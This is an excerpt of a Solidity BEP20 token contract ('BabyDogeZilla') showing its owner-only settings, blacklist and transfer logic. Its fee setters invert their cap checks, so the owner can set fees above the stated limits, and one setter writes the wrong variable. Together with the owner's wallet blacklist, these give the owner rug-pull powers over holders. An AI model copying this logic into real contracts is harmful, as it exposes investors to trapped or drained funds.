...
contract BabyDogeZilla is Context, IBEP20, Ownable {
    ...
    uint256 public _maxTxAmount = 138 * 10**19 * 10**9; // 2% 

    uint256 public constant _maxTxAmountLimit = 1380000 * 10**15 * 10**9; // 2%
    uint256 public constant _minTxAmountLimit = 34500 * 10**15 * 10**9; // 0.5% 

    uint256 public _minTriggerAmount = 69000 * 10**15 * 10**9; // 0.1%

    uint256 public constant _maxTriggerAmountLimit = 690000 * 10**15 * 10**9; // 1%
    uint256 public constant _minTriggerAmountLimit = 69000 * 10**15 * 10**9; // 0.1%

    function assignMaxTxAmount(uint256 maxTxAmount) external onlyOwner() {
        require(maxTxAmount >= _minTxAmountLimit && maxTxAmount <= _maxTxAmountLimit, "Max Tx Amount cannot be less than 69 Million");
        _maxTxAmount = maxTxAmount * 10**9;
        
        emit MaxTxAmountUpdated(_maxTxAmount);
    }
    
    function assignMinTriggerAmount(uint256 minTriggerAmount) external onlyOwner() {
        require(minTriggerAmount >= _minTriggerAmountLimit && minTriggerAmount <= _maxTriggerAmountLimit, "Swap Threshold Amount cannot be less than 69 Million");
        _minTriggerAmount = minTriggerAmount * 10**9;
    ...
    function assignMarketingFee(uint256 amount) public onlyOwner {
        require(amount > _marketingFeeLimit, "Marketing fee cannot be more than 8%");
    ...
    function assignLiquidityFee(uint256 amount) external onlyOwner() {
        require(amount > _liquidityFeeLimit, "Liquidity fee cannot be more than 6%");
    ...
    function assignBurningFee(uint256 amount) external onlyOwner() {
        require(amount > _burningFeeLimit, "Burning fee cannot be more than 4%");
        _liquidityFee = amount;
        emit LiquidityFeeUpdated(_msgSender(), amount);
    }
    ...
    function excludeFromStaking(address account) public onlyOwner() {
        ...
        _rOwned[account] = _tOwned[account].div(_getRate());
    ...
    event WithdrawOtherTokens(address indexed account, address indexed token, uint256 amount);
    function withdrawOtherTokens(IBEP20 tokenAddress, address account) external onlyOwner() {
        require(address(tokenAddress) != address(this), "Can't claim tokens.");

        uint256 balance = tokenAddress.balanceOf(address(this));

        tokenAddress.transfer(account, balance);

        emit WithdrawOtherTokens(account, address(tokenAddress), balance);
    }
    ...
    function distributeAirdropToHolder(address holder, uint256 amount) external onlyOwner {

        _transfer(_msgSender(), holder, amount * 10**9);

        emit HolderAirdrop(holder, amount);

    }
    
    function distributeAirdropToHolders(address[] calldata holders, uint256[] calldata amounts) external onlyOwner {
        ...
        while(iterator < holders.length){
            _transfer(_msgSender(), holders[iterator], amounts[iterator] * 10**9);
            iterator++;
        }
    ...
    function _transfer(
        ...
        bool overMinTokenBalance = contractTokenBalance >= _minTriggerAmount;
        if (
            overMinTokenBalance &&
            !inSwapAndLiquify &&
            from != pancakePair &&
            ...
            contractTokenBalance = _minTriggerAmount;
            //add liquidity
    ...
    function _tokenTransfer(address sender, address recipient, uint256 amount, bool takeFee) private {
        ...
        if(_blacklistedWallet[sender] || _blacklistedWallet[recipient]){
        ...
        if (_excludedFromStaking[sender] && !_excludedFromStaking[recipient]) {
            _transferFromExcluded(sender, recipient, amount);
        } else if (!_excludedFromStaking[sender] && _excludedFromStaking[recipient]) {
    ...
    function _removeFees() private {
        if(_stakingFee == 0 && _liquidityFee == 0) return;
